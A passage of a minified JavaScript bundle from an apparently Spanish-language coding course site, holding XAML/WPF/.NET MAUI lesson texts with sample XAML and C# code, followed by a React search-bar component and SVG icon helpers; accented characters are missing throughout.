2. Qu ventajas de seguridad ofrece WASM para este tipo de operaciones sensibles frente a JavaScript?

---

### Misin:
Un ingeniero de WebAssembly no solo hace cdigo rpido, sino que expande las fronteras de lo que es posible hacer dentro de una pestaa del navegador. 
`,completed:!1,isProject:!0}]},Zx={id:"xaml",title:"XAML / WPF / MAUI",description:"Disea interfaces de escritorio y mviles modernas con el lenguaje declarativo de .NET.",completed:!1,track:"Especializacin Frontend .NET",lessons:[{id:"xaml-01-intro-xaml",title:"Qu es XAML? Introduccin y Fundamentos",level:"junior",content:`# Leccin 1: Qu es XAML? Introduccin y Fundamentos

XAML (Extensible Application Markup Language) es el lenguaje declarativo creado por Microsoft para disear interfaces de usuario en aplicaciones .NET (WPF, UWP, .NET MAUI, Avalonia).

## 1. Relacin XAML  C#
XAML es solo una forma de instanciar objetos.
\`\`\`xml
<Button Content="Hola" Width="100"/>
\`\`\`
Es exactamente lo mismo que escribir en C#:
\`\`\`csharp
var btn = new Button();
btn.Content = "Hola";
btn.Width = 100;
\`\`\`
La ventaja de XAML es la separacin visual de la lgica.

## 2. Estructura Bsica
Un archivo XAML siempre comienza con un elemento raz (Root Element) y define espacios de nombres (XML Namespaces).
\`\`\`xml
<Window x:Class="MiApp.MainWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="Mi App" Height="450" Width="800">
    <!-- Contenido Aqu -->
</Window>
\`\`\`

---

### Misin Junior:
Entiende que cada etiqueta \`<Etiqueta>\` es una Clase y cada atributo \`Propiedad="..."\` es una Propiedad de esa clase. No hay magia, es instanciacin de objetos puros.
`,completed:!1},{id:"xaml-02-layouts",title:"Layouts y Paneles de Diseo",level:"junior",content:`# Leccin 2: Layouts y Paneles de Diseo

XAML usa "Contenedores" (Panels) para organizar los elementos. No se usan coordenadas X/Y fijas (evita \`Canvas\`).

## 1. StackPanel (Vertical / Horizontal)
Apila los elementos uno tras otro. Ideal para mens simples o listas de controles.
\`\`\`xml
<StackPanel Orientation="Vertical">
    <Button Content="Primero"/>
    <Button Content="Segundo"/>
</StackPanel>
\`\`\`

## 2. Grid (El rey de los Layouts)
Divide el espacio en filas y columnas. Es el 90% de tus layouts.

### Columnas y Filas: Tamaos
*   **Absoluto (\`100\`):** Tamao fijo en pxeles.
*   **Automtico (\`Auto\`):** Se ajusta al tamao del contenido.
*   **Proporcional (\`*\` / \`2*\`):** Toma el espacio restante. \`2*\` toma el doble que \`*\`.

### Grid Avanzado
Puedes usar \`SharedSizeGroup\` para sincronizar tamaos entre diferentes Grids o usar definiciones anidadas.
\`\`\`xml
<Grid>
    <Grid.ColumnDefinitions>
        <ColumnDefinition Width="Auto" MinWidth="100"/>
        <ColumnDefinition Width="*"/>
        <ColumnDefinition Width="2*"/>
    </Grid.ColumnDefinitions>
    
    <TextBlock Grid.Column="0" Text="Etiqueta fija"/>
    <Button Grid.Column="1" Content="Espacio 1/3"/>
    <Button Grid.Column="2" Content="Espacio 2/3"/>
</Grid>
\`\`\`

## 3. Responsive Bsico
En XAML, el "responsiveness" se logra mediante:
*   **Viewbox:** Escala todo su contenido para que quepa en el espacio disponible.
*   **UniformGrid:** Distribuye elementos en una cuadrcula donde todas las celdas tienen el mismo tamao.
*   **AdaptiveTrigger (MAUI/UWP):** Cambia el layout segn el ancho de la ventana.

## 4. Buenas Prcticas de Diseo
*   **Evita mrgenes fijos grandes:** Usa \`Padding\` y \`Margin\` para separaciones pequeas, pero deja que el \`Grid\` maneje el posicionamiento general.
*   **Min/Max Height/Width:** Siempre define lmites para evitar que la UI se rompa en pantallas muy pequeas o gigantes.
*   **No anides demasiados Paneles:** Muchos niveles de anidamiento degradan el rendimiento del renderizado.

---

### Misin Junior:
Usa \`Grid\` siempre que quieras controlar el espacio exacto. Usa \`StackPanel\` para listas simples. Nunca uses \`Canvas\` a menos que ests dibujando grficos vectoriales.
`,completed:!1},{id:"xaml-03-controles-basicos",title:"Controles Bsicos de Interfaz",level:"junior",content:`# Leccin 3: Controles Bsicos de Interfaz

Los controles son los "Ladrillos" de tu aplicacin XAML.

## 1. Entrada de Texto (Input)
*   **TextBox:** Entrada de una lnea. \`Text="{Binding ...}"\`.
*   **PasswordBox:** Entrada oculta (Ojo con la seguridad y MVVM).
*   **Label vs TextBlock:**
    *   \`TextBlock\`: Texto ligero de solo lectura (como un \`<span>\`).
    *   \`Label\`: Texto de etiqueta para formularios (como \`<label>\`). Soporta "Mnemnicos" (\`_Usuario\` hace Alt+U).

## 2. Botones y Accin
*   **Button:** El estndar. Tiene un evento \`Click\`.
*   **RepeatButton:** Dispara eventos continuos mientras se presiona.
*   **ToggleButton (CheckBox / RadioButton):** Tienen estado (Checked/Unchecked).

## 3. Listas (ItemsControl)
*   **ListBox:** Seleccin simple.
*   **ComboBox:** Dropdown select.
*   **ListView:** Tablas complejas con columnas.

---

### Misin Junior:
Nunca uses el evento \`Click\` en el Code-Behind (archivo .cs) si ests usando MVVM. Usa \`Command="{Binding MyCommand}"\`. Es el primer paso hacia una arquitectura limpia.
`,completed:!1},{id:"xaml-05-data-binding",title:"Data Binding y Patrn MVVM",level:"junior",content:`# Leccin 5: Data Binding y Patrn MVVM

El **Data Binding** es la caracterstica ms potente de XAML. Permite conectar la Interfaz de Usuario (View) con tus datos (ViewModel) de forma automtica.

## 1. Qu es Data Binding?
Es un puente entre una propiedad de la UI (ej. el \`Text\` de un Label) y una propiedad de un objeto C# (ej. el \`Nombre\` de un Usuario). Cuando los datos cambian, la UI se actualiza sola.

## 2. Binding Bsico (One-Way)
El flujo de datos va desde la fuente (C#) hacia el objetivo (XAML).
\`\`\`xml
<!-- En el XAML -->
<TextBlock Text="{Binding NombreUsuario}" />
\`\`\`

## 3. Two-Way Binding
Ideal para formularios. Si el usuario escribe en la UI, el objeto en C# se actualiza, y viceversa.
\`\`\`xml
<TextBox Text="{Binding Email, Mode=TwoWay, UpdateSourceTrigger=PropertyChanged}" />
\`\`\`
*   \`UpdateSourceTrigger=PropertyChanged\`: Actualiza el dato cada vez que presionas una tecla.

## 4. Introduccin a MVVM
MVVM (Model-View-ViewModel) es el patrn arquitectnico estndar en .NET.
*   **Model:** Tus datos puros (clases).
*   **View:** Tu archivo XAML (la cara de la app).
*   **ViewModel:** El intermediario. Contiene la lgica de la UI, comandos y propiedades bindeables.

### El Secreto: INotifyPropertyChanged
Para que la UI sepa que un dato cambi, el ViewModel debe implementar esta interfaz o usar herramientas como el **Community Toolkit MVVM**.

---

### Misin Junior:
El Data Binding elimina la necesidad de ponerle nombre (\`x:Name\`) a cada control y acceder a ellos desde el cdigo. Si ests escribiendo \`txtNombre.Text = "Hola"\`, probablemente lo ests haciendo mal. Usa Binding!
`,completed:!1},{id:"xaml-04-practica-junior",title:"Interfaz Junior en XAML",level:"junior",content:`# Prctica: Interfaz Junior en XAML

El diseo de UIs en XAML es como armar un rompecabezas.

---

## Reto 1: Login Simple
**Consigna:** Disea una pantalla de Login con:
1.  **Grid:** 2 filas (Login, Error) y 1 columna.
2.  **StackPanel Vertical:** Dentro de la fila 0.
    *   **Label:** "Usuario".
    *   **TextBox:** Con placeholder "Ingresa tu email".
    *   **Label:** "Contrasea".
    *   **PasswordBox.**
    *   **Button:** "Iniciar Sesin".
3.  **TextBlock:** En la fila 1, texto rojo, oculto por defecto (\`Visibility="Collapsed"\`).

## Reto 2: Layout Complejo
**Consigna:** Crea una "Calculadora" visual (solo UI, sin lgica).
1.  **Grid:** 5 filas (Display, y 4 filas de botones), 4 columnas.
2.  **Display:** Debe ocupar toda la primer fila (\`Grid.ColumnSpan="4"\`).
3.  Usa **Styles** (Estilos locales) para que todos los botones tengan margen \`5\` y fuente \`Arial\`.

## Reto 3: Lista de Compras
**Consigna:**
*   **Grid:** 2 columnas (Izquierda: Formulario, Derecha: Lista) separadas por un \`GridSplitter\` (opcional, si te animas).
*   **Izquierda:** TextBox + Button "Agregar".
*   **Derecha:** ListView que muestre Strings.

---

### Solucin Sugerida (Parte 1):
\`\`\`xml
<Grid Margin="20">
    <StackPanel VerticalAlignment="Center" Width="300">
        <TextBlock Text="Bienvenido" FontSize="24" HorizontalAlignment="Center" Margin="0,0,0,20"/>
        
        <Label Content="Usuario:"/>
        <TextBox x:Name="txtUser" Padding="5"/>
        
        <Label Content="Password:" Margin="0,10,0,0"/>
        <PasswordBox x:Name="txtPass" Padding="5"/>
        
        <Button Content="Entrar" Margin="0,20,0,0" Padding="10"/>
    </StackPanel>
</Grid>
\`\`\`
`,completed:!1,isProject:!0},{id:"xaml-06-mvvm-avanzado",title:"MVVM Avanzado, Commands y Converters",level:"semi-senior",content:`# Leccin 6: MVVM Avanzado, Commands y Converters

En el nivel Semi-Senior, dejamos de ver MVVM como una "sugerencia" y lo adoptamos como la arquitectura base.

## 1. El Patrn MVVM Profundo
No basta con bincdear texto. Un verdadero ViewModel maneja el **estado de la aplicacin**.
*   **Separacin de Responsabilidades:** La View no debe conocer la existencia de la base de datos o servicios.
*   **ObservableCollection:** La clase reina para bindeo de colecciones que notifican cambios a la UI.

## 2. Los Commands (ICommand)
En lugar de usar eventos como \`Click=""\`, usamos \`Command=""\`. Esto permite:
*   **Desacoplamiento:** El botn no sabe qu lgica ejecuta, solo dispara un comando.
*   **Lgica de Ejecucin (\`CanExecute\`):** El botn se deshabilita automticamente si las condiciones no se cumplen.
\`\`\`xml
<Button Content="Guardar" Command="{Binding SaveCommand}" />
\`\`\`

## 3. IValueConverter
A veces el tipo de dato en C# no coincide con lo que la UI necesita (ej: un \`bool\` que debe mostrar/ocultar un panel).
\`\`\`csharp
public class BoolToVisibilityConverter : IValueConverter {
    public object Convert(object value, ...) {
        return (bool)value ? Visibility.Visible : Visibility.Collapsed;
    }
}
\`\`\`
Se declara en Recursos y se usa as:
\`\`\`xml
<Grid Visibility="{Binding EsVisible, Converter={StaticResource MyBoolConverter}}" />
\`\`\`

---

### Misin Semi-Senior:
Aprende a usar el **CommunityToolkit.Mvvm**. El uso de \`[ObservableProperty]\` y \`[RelayCommand]\` reduce drsticamente el cdigo repetitivo (Boilerplate) y es el estndar moderno en la industria.
`,completed:!1},{id:"xaml-07-styles-resources",title:"Recursos, Estilos y Templates",level:"semi-senior",content:`# Leccin 7: Recursos, Estilos y Templates

Para crear interfaces premium y mantenibles, debemos centralizar la apariencia.

## 1. Resources (Static vs Dynamic)
Los recursos permiten definir objetos una vez y usarlos en toda la app.
*   **StaticResource:** Se evala al cargar la pgina (mejor rendimiento).
*   **DynamicResource:** Permite cambiar el valor en tiempo de ejecucin (til para Temas/Dark Mode).

## 2. Styles y Setters
Evita repetir propiedades. Define estilos globales o locales.
\`\`\`xml
<Style TargetType="Button" x:Key="PrimaryButtonStyle">
    <Setter Property="Background" Value="#2563eb"/>
    <Setter Property="Foreground" Value="White"/>
    <Setter Property="Padding" Value="10,5"/>
</Style>
\`\`\`

## 3. DataTemplates
Define **cmo se ve un objeto**. Es fundamental para listas complejas.
*   Si tienes una lista de \`Usuarios\`, el DataTemplate define que cada usuario se vea como una tarjeta con su foto y nombre.

## 4. ControlTemplates (Redefiniendo la UI)
Es el nivel ms avanzado de personalizacin. Permite cambiar la **estructura visual** de un control sin cambiar su comportamiento.
*   Puedes hacer que un \`Button\` sea un crculo perfecto con una animacin de pulso, pero que siga teniendo su evento \`Click\` y \`Command\`.

---

### Misin Semi-Senior:
Diferencia claramente entre un **DataTemplate** (datos) y un **ControlTemplate** (estructura del control). Si quieres cambiar cmo se ve un tem en una lista, usa DataTemplate. Si quieres que el botn tenga sombras y bordes redondeados personalizados, usa ControlTemplate.
`,completed:!1},{id:"xaml-08-practica-semi-senior",title:"Prctica: Proyecto MVVM Moderno",level:"semi-senior",content:`# Prctica: Proyecto MVVM Moderno

Implementemos una aplicacin CRUD (Create, Read, Update, Delete) usando MVVM puro y Estilos.

---

## Reto 1: Definir el Modelo y ViewModel
**Consigna:** Crea una clase \`Producto\` (Nombre, Precio) y un \`ProductoViewModel\` (lista ObservableCollection, comandos Agregar y Eliminar).
1.  Usa \`INotifyPropertyChanged\` o un framework (Community Toolkit) para manejar las actualizaciones de propiedades.

## Reto 2: Crear la Interfaz (View)
**Consigna:**
*   **Encabezado:** Un estilo global para ttulos (\`FontSize=20\`, \`Negrita\`).
*   **Lista:** Un \`ListView\` bindeado a \`Productos\`. Usa un \`ItemTemplate\` personalizado para mostrar el producto como una tarjeta.
*   **Formulario:** 2 TextBox y un botn vinculados a las propiedades de edicin en el VM.
*   **Estilos:** Los TextBox deben tener un borde sutil y margen.

## Reto 3: IValueConverter (Bonus)
**Consigna:** Crea un \`BoolToVisibilityConverter\`.
*   Si la lista est vaca, muestra un TextBlock "No hay productos" (\`Visibility=Visible\`). Si no, \`Collapsed\`.

---

### Solucin Sugerida (Parte 1):
\`\`\`csharp
public partial class MainViewModel : ObservableObject {
    [ObservableProperty]
    private string nombre;

    [ObservableProperty]
    private ObservableCollection<Producto> productos = new();

    [RelayCommand]
    private void Agregar() {
        if (!string.IsNullOrEmpty(Nombre))
            Productos.Add(new Producto { Nombre = Nombre });
    }
}
\`\`\`
`,completed:!1,isProject:!0},{id:"xaml-09-integracion",title:"Integracin XAML + C#",level:"junior",content:`# Leccin 9: Integracin XAML + C#

La verdadera potencia de XAML reside en cmo se comunica con el cdigo C#.

## 1. El Code-behind (.xaml.cs)
Cada archivo de vista (\`Page.xaml\`) tiene un archivo compaero (\`Page.xaml.cs\`).
*   **x:Class:** Define la clase parcial en XAML que se une con la de C#.
*   **InitializeComponent():** El mtodo que "infla" el XAML y crea los objetos en memoria.

## 2. El ViewModel (El cerebro)
La forma correcta de integrar la lgica no es en el Code-behind, sino mediante un **ViewModel**.
*   **DataContext:** Es la propiedad de la Vista que le dice: "Tus datos estn en este objeto".
\`\`\`csharp
public MainWindow() {
    InitializeComponent();
    this.DataContext = new MainViewModel();
}
\`\`\`

## 3. Comunicacin Vista <-> Lgica
*   **De Vista a Lgica:** Mediante **Commands**. El usuario hace click -> El comando se ejecuta en el VM.
*   **De Lgica a Vista:** Mediante **INotifyPropertyChanged**. El VM cambia un dato -> La UI se refresca sola.
*   **Eventos:** Solo para lgica puramente visual (animaciones, foco) que no pertenece a la lgica de negocio.

---

### Misin Junior:
Mantn el Code-behind lo ms vaco posible. Si puedes resolverlo con Binding o un Command, no escribas cdigo en el \`.xaml.cs\`. Tu objetivo es tener una "Vista Tonta" y un "ViewModel Inteligente".
`,completed:!1},{id:"xaml-10-maui",title:"XAML en .NET MAUI",level:"semi-senior",content:`# Leccin 10: XAML en .NET MAUI

.NET MAUI es la evolucin multiplataforma de Xamarin.Forms, permitiendo crear apps para Android, iOS, Windows y macOS con un solo cdigo.

## 1. Estructura de Proyecto MAUI
*   **Platforms/:** Cdigo especfico para cada SO (sensores, permisos).
*   **Resources/:** Imgenes, fuentes y estilos globales (\`App.xaml\` y \`AppShell.xaml\`).
*   **MauiProgram.cs:** El punto de entrada donde se configuran servicios y fuentes.

## 2. UI Multiplataforma
XAML en MAUI introduce etiquetas especficas para el manejo de diferentes pantallas:
*   **OnPlatform:** Aplica valores segn el sistema operativo.
*   **OnIdiom:** Ajusta la UI si es Telfono, Tablet o Desktop.
\`\`\`xml
<Button Text="Click" WidthRequest="{OnPlatform WinUI=200, Android=100}" />
\`\`\`

## 3. Navegacin con AppShell
Shell simplifica la navegacin mediante rutas tipo URL.
*   **Tabbar / Flyout:** Mens de pestaas o laterales definidos en XAML.
*   **Navegacin Programtica:** \`Shell.Current.GoToAsync("//LoginPage")\`.

## 4. Buenas Prcticas
*   **Compiled Bindings (x:DataType):** Aumenta el rendimiento y permite validacin en tiempo de compilacin.
*   **Layout Optimization:** Evita el uso excesivo de \`StackLayout\` anidados; prefiere \`Grid\` para layouts complejos para mejorar el renderizado.
*   **Handlers:** Si necesitas acceso nativo, usa el patrn de Handlers/Mappers en lugar de Custom Renderers.

---

### Misin Semi-Senior:
Domina el uso de **AppShell**. Es la columna vertebral de cualquier aplicacin mvil moderna en MAUI y te permite gestionar rutas, parmetros y apariencia global desde un solo archivo XAML.
`,completed:!1},{id:"xaml-11-arquitectura-pro",title:"Arquitectura Profesional y Modularizacin",level:"senior",content:`# Leccin 11: Arquitectura Profesional y Modularizacin

En el nivel Senior, XAML no es solo diseo, es la base de un sistema escalable y mantenible a largo plazo.

## 1. Arquitectura MVVM Profesional
Ms all de bindeos bsicos, una arquitectura empresarial utiliza:
*   **Inyeccin de Dependencias (DI):** Registro de ViewModels y Servicios en el contenedor de dependencias (\`IServiceCollection\`).
*   **Messenger / EventAggregator:** Comunicacin desacoplada entre diferentes componentes de la app mediante mensajes (Pub/Sub).
*   **Validacin Avanzada:** Uso de \`INotifyDataErrorInfo\` para validaciones asncronas y de servidor.

## 2. Modularizacin y Reutilizacin
*   **UserControls vs CustomControls:**
    *   \`UserControl\`: Composicin de controles existentes (fcil y rpido).
    *   \`CustomControl\`: Hereda de \`Control\`, usa un \`Generic.xaml\` y permite una personalizacin profunda mediante \`DefaultStyleKey\`.
*   **ResourceDictionaries Externos:** Organizacin de estilos, colores y plantillas en libreras de clases separadas para compartir entre proyectos.

## 3. Manejo de Estado Complejo
*   **State Containers:** Gestin de estados de carga (Loading), error y datos vacos de forma declarativa en XAML.
*   **Navigation Abstracta:** El ViewModel nunca conoce la View; la navegacin se resuelve mediante una interfaz \`INavigationService\`.

---

### Misin Senior:
Implementa siempre **Inyeccin de Dependencias**. Un ViewModel senior recibe sus servicios por constructor, permitiendo que la aplicacin sea 100% testeable mediante Unit Testing.
`,completed:!1},{id:"xaml-12-performance",title:"Performance en UI y Animaciones",level:"senior",content:`# Leccin 12: Performance en UI y Animaciones

Una aplicacin senior debe sentirse fluida (60 FPS) y visualmente atractiva sin comprometer recursos.

## 1. Optimizacin del Rendimiento
*   **Virtualizacin de UI:** Uso de \`VirtualizingStackPanel\` para manejar miles de elementos en listas sin degradar la memoria.
*   **Binding Improvements:** 
    *   Uso de \`Mode=OneTime\` para datos estticos.
    *   \`x:Bind\` (UWP/WinUI/MAUI) para bindeos en tiempo de compilacin.
*   **Layout Profiling:** Reduccin de la profundidad del rbol visual (Visual Tree). Cada nivel de anidamiento aade un costo de clculo de medida y posicin.

## 2. Animaciones Avanzadas
XAML permite animaciones potentes basadas en Storyboards y Visual States.
*   **Storyboards:** Control preciso sobre el tiempo, interpolacin (Easing Functions) y propiedades.
*   **VisualStateManager (VSM):** Define cmo cambian los controles segn su estado (MouseOver, Focused, Error, Mobile vs Desktop).
\`\`\`xml
<VisualState Name="PointerOver">
    <Storyboard>
        <ColorAnimation Storyboard.TargetProperty="Background.Color" To="Red" Duration="0:0:0.2"/>
    </Storyboard>
</VisualState>
\`\`\`

## 3. Composicin y Efectos
*   **Shaders y Brushes:** Uso de \`LinearGradientBrush\`, \`ImageBrush\` y efectos de Blur o DropShadow sin sobrecargar el hilo de UI.
*   **Lottie & Rive:** Integracin de animaciones vectoriales complejas externas para una experiencia premium.

---

### Misin Senior:
Nunca uses el hilo principal para tareas pesadas. Aprende a usar el **Visual Tree Helper** para debuggear problemas de rendimiento y asegrate de que tus animaciones sean "Non-blocking" para la interaccin del usuario.
`,completed:!1},{id:"xaml-13-practica-senior",title:"Prctica: Dashboard Empresarial Escalable",level:"senior",content:`# Prctica Senior: Dashboard Empresarial Escalable

El desafo final consiste en disear el ncleo de una aplicacin de nivel empresarial que sea modular, rpida y estticamente superior.

---

## Reto 1: Estructura Modular (Arquitectura)
**Consigna:** Disea el esqueleto de una aplicacin con DI y Messenger.
1.  Configura un **ServiceLocator** o usa \`Microsoft.Extensions.DependencyInjection\`.
2.  Crea un sistema de navegacin donde los ViewModels soliciten cambiar de pantalla sin conocer las clases de la Vista.
3.  Implementa un \`NotificationService\` que pueda disparar avisos (Toasts) desde cualquier ViewModel mediante mensajes desacoplados.

## Reto 2: UI Dinmica y Performance
**Consigna:** Crea un "Explorador de Datos" de alto rendimiento.
1.  Usa un \`ListView\` con **Virtualizacin activada**.
2.  Crea un \`DataTemplateSelector\` para mostrar diferentes tipos de filas segn el tipo de dato.
3.  Asegura que el scroll se mantenga a 60 FPS incluso con 10,000 registros ficticios.

## Reto 3: Experiencia de Usuario (VSM)
**Consigna:**
*   Implementa un **VisualStateManager** avanzado para el men lateral.
*   Al colapsar el men, los iconos deben animarse suavemente y las etiquetas deben desaparecer con un efecto de \`FadeOut\`.
*   Aade un "Skeleton Loader" animado mientras se simula la carga de datos.

---

### Solucin Sugerida (Concepto DI):
\`\`\`csharp
// MauiProgram.cs o App.xaml.cs
public static class MauiProgram {
    public static MauiApp CreateMauiApp() {
        var builder = MauiApp.CreateBuilder();
        
        // Registro de Servicios
        builder.Services.AddSingleton<IDataService, AzureDataService>();
        builder.Services.AddSingleton<INavigationService, ShellNavigationService>();
        
        // Registro de ViewModels
        builder.Services.AddTransient<MainViewModel>();
        builder.Services.AddTransient<DetailsViewModel>();

        return builder.Build();
    }
}
\`\`\`
`,completed:!1,isProject:!0}]},bv=[Nx,Ox,zx,Yb,Ux,Bx,Vx,Xb,Zb,ev,Fx,Hx,Gx,av,tv,nv,ov,iv,Jx,rv,sv,Qx,lv,cv,Wx,uv,dv,pv,Kx,$x,mv,fv,Yx,hv,Xx,gv,Zx],ej=a=>bv.find(e=>e.id===a),G1=()=>{const[a,e]=F.useState(""),[t,o]=F.useState([]),[r,l]=F.useState(!1),c=ir(),d=F.useRef(null);F.useEffect(()=>{if(a.length<2){o([]);return}const p=[];bv.forEach(v=>{v.title.toLowerCase().includes(a.toLowerCase())?v.lessons.forEach(y=>{p.push({moduleId:v.id,lessonId:y.id,title:y.title,moduleTitle:v.title.split(":")[0]})}):v.lessons.forEach(y=>{y.title.toLowerCase().includes(a.toLowerCase())&&p.push({moduleId:v.id,lessonId:y.id,title:y.title,moduleTitle:v.title.split(":")[0]})})}),o(p.slice(0,8))},[a]),F.useEffect(()=>{const p=v=>{d.current&&!d.current.contains(v.target)&&l(!1)};return document.addEventListener("mousedown",p),()=>document.removeEventListener("mousedown",p)},[]);const f=(p,v)=>{e(""),l(!1),c(`/learn/${p}?lesson=${v}`)};return g.jsxs("div",{className:"search-bar-container",ref:d,children:[g.jsx("input",{type:"text",className:"search-input",placeholder:"Buscar lecciones o temas...",value:a,onChange:p=>{e(p.target.value),l(!0)},onFocus:()=>l(!0)}),r&&t.length>0&&g.jsx("ul",{className:"search-results",children:t.map((p,v)=>g.jsxs("li",{className:"search-result-item",onClick:()=>f(p.moduleId,p.lessonId),children:[g.jsx("span",{className:"result-title",children:p.title}),g.jsx("span",{className:"result-module",children:p.moduleTitle})]},`${p.moduleId}-${p.lessonId}-${v}`))})]})};var aj={color:void 0,size:void 0,className:void 0,style:void 0,attr:void 0},J1=mt.createContext&&mt.createContext(aj),rN=["attr","size","title"];function sN(a,e){if(a==null)return{};var t=lN(a,e),o,r;if(Object.getOwnPropertySymbols){var l=Object.getOwnPropertySymbols(a);for(r=0;r<l.length;r++)o=l[r],!(e.indexOf(o)>=0)&&Object.prototype.propertyIsEnumerable.call(a,o)&&(t[o]=a[o])}return t}function lN(a,e){if(a==null)return{};var t={};for(var o in a)if(Object.prototype.hasOwnProperty.call(a,o)){if(e.indexOf(o)>=0)continue;t[o]=a[o]}return t}function Qp(){return Qp=Object.assign?Object.assign.bind():function(a){for(var e=1;e<arguments.length;e++){var t=arguments[e];for(var o in t)Object.prototype.hasOwnProperty.call(t,o)&&(a[o]=t[o])}return a},Qp.apply(this,arguments)}function Q1(a,e){var t=Object.keys(a);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(a);e&&(o=o.filter(function(r){return Object.getOwnPropertyDescriptor(a,r).enumerable})),t.push.apply(t,o)}return t}function Wp(a){for(var e=1;e<arguments.length;e++){var t=arguments[e]!=null?arguments[e]:{};e%2?Q1(Object(t),!0).forEach(function(o){cN(a,o,t[o])}):Object.getOwnPropertyDescriptors?Object.defineProperties(a,Object.getOwnPropertyDescriptors(t)):Q1(Object(t)).forEach(function(o){Object.defineProperty(a,o,Object.getOwnPropertyDescriptor(t,o))})}return a}function cN(a,e,t){return e=uN(e),e in a?Object.defineProperty(a,e,{value:t,enumerable:!0,configurable:!0,writable:!0}):a[e]=t,a}function uN(a){var e=dN(a,"string");return typeof e=="symbol"?e:e+""}function dN(a,e){if(typeof a!="object"||!a)return a;var t=a[Symbol.toPrimitive];if(t!==void 0){var o=t.call(a,e);if(typeof o!="object")return o;throw new TypeError("@@toPrimitive must return a primitive value.")}return(e==="string"?String:Number)(a)}function tj(a){return a&&a.map((e,t)=>mt.createElement(e.tag,Wp({key:t},e.attr),tj(e.child)))}function Ze(a){return e=>mt.createElement(pN,Qp({attr:Wp({},a.attr)},e),tj(a.child))}function pN(a){var e=t=>{var{attr:o,size:r,title:l}=a,c=sN(a,rN),d=r||t.size||"1em",f;return t.className&&(f=t.className),a.className&&(f=(f?f+" ":"")+a.className),mt.createElement("svg",Qp({stroke:"currentColor",fill:"currentColor",strokeWidth:"0"},t.attr,o,c,{className:f,style:Wp(Wp({color:a.color||t.color},t.style),a.style),height:d,width:d,xmlns:"http://www.w3.org/2000/svg"}),l&&mt.createElement("title",null,l),a.children)};return J1!==void 0?mt.createElement(J1.Consumer,null,t=>e(t)):e(aj)}function Gh(a){return Ze({attr:{viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"},child:[{tag:"polyline",attr:{points:"22 12 18 12 15 21 9 3 6 12 2 12"},child:[]}]})(a)}function mN(a){return Ze({attr:{viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"},child:[{tag:"path",attr:{d:"M4 19.5A2.5 2.5 0 0 1 6.5 17H20"},child:[]},{tag:"path",attr:{d:"M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"},child:[]}]})(a)}function xc(a){return Ze({attr:{viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"},child:[{tag:"path",attr:{d:"M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"},child:[]},{tag:"polyline",attr:{points:"3.27 6.96 12 12.01 20.73 6.96"},child:[]},{tag:"line",attr:{x1:"12",y1:"22.08",x2:"12",y2:"12"},child:[]}]})(a)}function W1(a){return Ze({attr:{viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"},child:[{tag:"path",attr:{d:"M22 11.08V12a10 10 0 1 1-5.93-9.14"},child:[]},{tag:"polyline",attr:{points:"22 4 12 14.01 9 11.01"},child:[]}]})(a)}function K1(a){return Ze({attr:{viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"},child:[{tag:"polyline",attr:{points:"20 6 9 17 4 12"},child:[]}]})(a)}function zg(a){return Ze({attr:{viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"},child:[{tag:"polyline",attr:{points:"9 18 15 12 9 6"},child:[]}]})(a)}function fN(a){return Ze({attr:{viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"},child:[{tag:"polyline",attr:{points:"16 18 22 12 16 6"},child:[]},{tag:"polyline",attr:{points:"8 6 2 12 8 18"},child:[]}]})(a)}function Gc(a){return Ze({attr:{viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"},child:[{tag:"rect",attr:{x:"9",y:"9",width:"13",height:"13",rx:"2",ry:"2"},child:[]},{tag:"path",attr:{d:"M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"},child:[]}]})(a)}function $1(a){return Ze({attr:{viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"},child:[{tag:"rect",attr:{x:"4",y:"4",width:"16",height:"16",rx:"2",ry:"2"},child:[]},{tag:"rect",attr:{x:"9",y:"9",width:"6",height:"6"},child:[]},{tag:"line",attr:{x1:"9",y1:"1",x2:"9",y2:"4"},child:[]},{tag:"line",attr:{x1:"15",y1:"1",x2:"15",y2:"4"},child:[]},{tag:"line",attr:{x1:"9",y1:"20",x2:"9",y2:"23"},child:[]},{tag:"line",attr:{x1:"15",y1:"20",x2:"15",y2:"23"},child:[]},{tag:"line",attr:{x1:"20",y1:"9",x2:"23",y2:"9"},child:[]},{tag:"line",attr:{x1:"20",y1:"14",x2:"23",y2:"14"},child:[]},{tag:"line",attr:{x1:"1",y1:"9",x2:"4",y2:"9"},child:[]},{tag:"line",attr:{x1:"1",y1:"14",x2:"4",y2:"14"},child:[]}]})(a)}function hN(a){return Ze({attr:{viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"},child:[{tag:"ellipse",attr:{cx:"12",cy:"5",rx:"9",ry:"3"},child:[]},{tag:"path",attr:{d:"M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"},child:[]},{tag:"path",attr:{d:"M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"},child:[]}]})(a)}function gN(a){return Ze({attr:{viewBox:"0 0 24 